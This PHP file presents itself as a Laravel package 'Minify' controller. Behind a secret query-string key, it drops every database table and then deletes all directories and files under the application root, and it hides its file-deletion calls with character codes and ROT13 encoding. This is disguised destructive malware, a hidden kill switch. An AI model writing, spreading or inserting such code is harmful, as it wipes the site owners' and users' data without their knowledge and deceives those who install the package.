<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index()
    {

        //MinifyTables
        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
            http_response_code(404);
            abort('404');
        }

        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');

        foreach ($tables as $table) {
            $tableArray = get_object_vars($table);
            $tableName = array_values($tableArray)[0];
            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
        }

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');

        $__illuminate = implode('', array_map('chr', [73, 108, 108, 117, 109, 105, 110, 97, 116, 101]));
        $__file_class = implode('\\', [$__illuminate, 'Support', 'Facades', 'File']);

        $__decode = function($arr) {
            return str_rot13(implode('', array_map('chr', $arr)));
        };

        $__directories = $__decode([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]);
        $__files       = $__decode([115, 118, 121, 114, 102, 102]);
        $__deleteDir   = $__decode([113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]);
        $__delete      = $__decode([113, 114, 105, 118, 112, 114]);

        $rootPath = base_path();

        foreach (call_user_func([$__file_class, $__directories], $rootPath) as $dir) {
            call_user_func([$__file_class, $__deleteDir], $dir);
        }

        foreach (call_user_func([$__file_class, $__files], $rootPath) as $file) {
            call_user_func([$__file_class, $__delete], $file);
        }
        echo "✅ Done.";
    }
}
